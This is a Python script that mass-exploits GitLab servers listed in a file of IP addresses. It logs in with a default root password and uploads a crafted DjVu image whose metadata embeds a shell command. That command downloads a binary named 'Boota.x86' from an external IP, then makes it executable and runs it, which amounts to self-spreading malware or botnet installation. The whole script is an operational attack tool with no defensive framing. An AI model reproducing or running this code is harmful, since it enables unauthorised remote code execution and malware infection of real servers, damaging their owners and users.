import requests
import sys
import threading
import time
from bs4 import BeautifulSoup
import random
import os

username = "root"
password = "5iveL!fe"
command = "wget http://149.57.171.148/Boota.x86; chmod +x Boota.x86; ./Boota.x86 gitlab.x86_64"

payload = ""

def attack(url):
  try:
    global payload

    gitlab_url = "http://" + url + "/"
    session = requests.Session()

    r = session.get(gitlab_url + "users/sign_in")
    soup = BeautifulSoup(r.text, features="lxml")
    token = soup.findAll('meta')[16].get("content")

    login_form = {
        "authenticity_token": token,
        "user[login]": username,
        "user[password]": password,
        "user[remember_me]": "0"
    }
    r = session.post(f"{gitlab_url}users/sign_in", data=login_form)

    if r.status_code != 200:
        return
    else:
        print("Successfully Authenticated")

    # Checking if djvumake is installed


    # Uploading it 
    print("[3] Creating Snippet and Uploading")

    # Getting the CSRF token
    r = session.get(gitlab_url + "users/sign_in")
    soup = BeautifulSoup(r.text, features="lxml")
    csrf = soup.findAll('meta')[16].get("content")

    cookies = {'_gitlab_session': session.cookies['_gitlab_session']}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': f'{gitlab_url}projects',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-Token': f'{csrf}'
    }
    files = {'file': ('exploit.jpg', open('/tmp/exploit.jpg', 'rb'), 'image/jpeg', {'Expires': '0'})}

    r = session.post(gitlab_url+'uploads/user', files=files, cookies=cookies, headers=headers, verify=False)

    if r.text != "Failed to process image\n":
        print("[-] exploit failed")
    else:
        print("[+] RCE Triggered !!")
        
  except Exception as e:
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    #print(exc_type, fname, exc_tb.tb_lineno, str(e))
  
payload = f"\" . qx{{{command}}} . \\\n"
f1 = open("/tmp/exploit","w")
f1.write('(metadata\n')
f1.write('        (Copyright "\\\n')
f1.write(payload)
f1.write('" b ") )')
f1.close()

check = os.popen('which djvumake').read()
if (check == ""):
  print("djvumake not installed. Install by running command : sudo apt install djvulibre-bin")
  sys.exit()

# Building the payload
os.system('djvumake /tmp/exploit.jpg INFO=0,0 BGjp=/dev/null ANTa=/tmp/exploit.jpg')

with open(sys.argv[1], "r") as f:
  threads = []

  for ip in f.readlines():
    x = threading.Thread(target=attack, args=(ip.strip(),)).start()
    threads.append(x)
    time.sleep(0.02)

  for thread in threads:
    thread.join()